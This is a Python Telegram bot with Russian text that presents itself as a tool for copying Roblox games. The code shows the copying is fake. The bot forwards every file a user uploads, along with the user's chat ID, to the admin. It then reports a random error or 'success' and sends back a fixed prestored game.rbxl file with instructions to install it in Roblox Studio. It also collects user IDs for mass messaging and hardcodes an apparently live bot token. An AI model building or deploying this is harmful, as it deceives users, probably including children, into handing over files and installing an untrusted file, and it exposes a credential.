import telebot
from telebot import types
import random
import json
import os

# --- 1. НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ПРОВЕРЬ) ---
API_TOKEN = '8480317600:AAFFTPcDLKH4RPRoLEnygaDKEvPMHp8d18U'  # Токен от @BotFather
ADMIN_ID = 6655100280                   # Твой ID
CHANNEL_URL = 'https://t.me/vegamonster1' # Ссылка на туториал
DB_FILE = 'users.json'                  # Файл базы данных

bot = telebot.TeleBot(API_TOKEN)
bot_enabled = True # Статус работы бота (можно менять из админки)

# Функция для сохранения ID пользователя в базу
def save_user(user_id):
    users = []
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                users = json.load(f)
        except:
            users = []
    if user_id not in users:
        users.append(user_id)
        with open(DB_FILE, 'w') as f:
            json.dump(users, f)

# --- АДМИН ПАНЕЛЬ ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.chat.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup(row_width=1)
        status_text = "✅ РАБОТАЕТ" if bot_enabled else "❌ ВЫКЛЮЧЕН"
        
        btn_broadcast = types.InlineKeyboardButton("📢 Рассылка всем", callback_data="admin_broadcast")
        btn_toggle = types.InlineKeyboardButton(f"Статус бота: {status_text}", callback_data="admin_toggle")
        btn_stats = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
        
        markup.add(btn_broadcast, btn_toggle, btn_stats)
        bot.send_message(ADMIN_ID, "🛠 **Панель управления администратора**", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_logic(call):
    global bot_enabled
    if call.message.chat.id != ADMIN_ID: return

    if call.data == "admin_toggle":
        bot_enabled = not bot_enabled
        bot.answer_callback_query(call.id, "Статус изменен!")
        admin_panel(call.message) # Обновляем сообщение админки

    elif call.data == "admin_stats":
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                count = len(json.load(f))
            bot.send_message(ADMIN_ID, f"👥 В базе пользователей: **{count}**", parse_mode='Markdown')
        else:
            bot.send_message(ADMIN_ID, "👥 Пользователей пока нет.")

    elif call.data == "admin_broadcast":
        msg = bot.send_message(ADMIN_ID, "💬 Введи текст рассылки (или напиши /cancel):")
        bot.register_next_step_handler(msg, run_broadcast)

def run_broadcast(message):
    if message.text == "/cancel":
        bot.send_message(ADMIN_ID, "❌ Отменено.")
        return
    
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            users = json.load(f)
        
        bot.send_message(ADMIN_ID, f"🚀 Начинаю рассылку для {len(users)} чел...")
        success = 0
        for u_id in users:
            try:
                bot.send_message(u_id, message.text)
                success += 1
            except:
                pass
        bot.send_message(ADMIN_ID, f"✅ Готово! Получили: {success} пользователей.")

# --- ОСНОВНАЯ ЛОГИКА БОТА ---
@bot.message_handler(commands=['start'])
def start(message):
    save_user(message.chat.id)
    if not bot_enabled and message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🛠 Извини, бот на тех. обслуживании.")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("✅ Начать копирование", callback_data='step_1')
    btn_tutor = types.InlineKeyboardButton("📖 Tutorial (Канал)", url=CHANNEL_URL)
    markup.add(btn_start, btn_tutor)
    
    text = "🟢 **Привет!** С помощью этого бота ты можешь копировать плейсы Roblox.\n\nНажми на кнопку, чтобы начать!"
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'step_1')
def ask_game(call):
    if not bot_enabled and call.message.chat.id != ADMIN_ID:
        bot.send_message(call.message.chat.id, "❌ Бот выключен.")
        return
    msg = bot.send_message(call.message.chat.id, "🧪 **Шаг 1:** Напиши название игры, которую хочешь скопировать:")
    bot.register_next_step_handler(msg, process_game)

def process_game(message):
    if message.text == "🔄 Повторить попытку":
        start(message)
        return
    msg = bot.send_message(message.chat.id, "🟢 **Шаг 2:** Теперь отправь файл этой игры (.rbxl или любой другой):")
    bot.register_next_step_handler(msg, process_file)

def process_file(message):
    chat_id = message.chat.id
    
    # Если нажали кнопку вместо файла
    if message.text == "🔄 Повторить попытку":
        start(message)
        return

    if message.content_type in ['document', 'photo', 'video']:
        # Пересылаем админу
        bot.send_message(ADMIN_ID, f"📥 **НОВЫЙ ФАЙЛ ПРИШЕЛ!**\nID: `{chat_id}`", parse_mode='Markdown')
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        # Шанс 25/75
        chance = random.randint(1, 100)
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔄 Повторить попытку")

        if chance <= 25: # 25% на ошибку
            bot.send_message(chat_id, "⚠️ **Ошибка копирования!** Сбой в зашифрованных данных. Попробуй еще раз.", reply_markup=markup)
        else: # 75% на успех
            bot.send_message(chat_id, "⌛ **Копирование почти завершено...** Подготавливаю файл.")
            try:
                with open('game.rbxl', 'rb') as f:
                    bot.send_document(chat_id, f, caption="📎 Компонент успешно скопирован! Установи его в Roblox Studio.", reply_markup=markup)
            except:
                bot.send_message(chat_id, "❌ Ошибка: системный файл game.rbxl не найден. Напиши админу.", reply_markup=markup)
    else:
        # Если прислали текст вместо файла
        msg = bot.send_message(chat_id, "❌ Ошибка! Нужно отправить **файл**. Попробуй снова или нажми кнопку:", 
                               reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔄 Повторить попытку"))
        bot.register_next_step_handler(msg, process_file)

# Запуск бота
print("Бот успешно запущен на Bothost!")
bot.polling(none_stop=True)
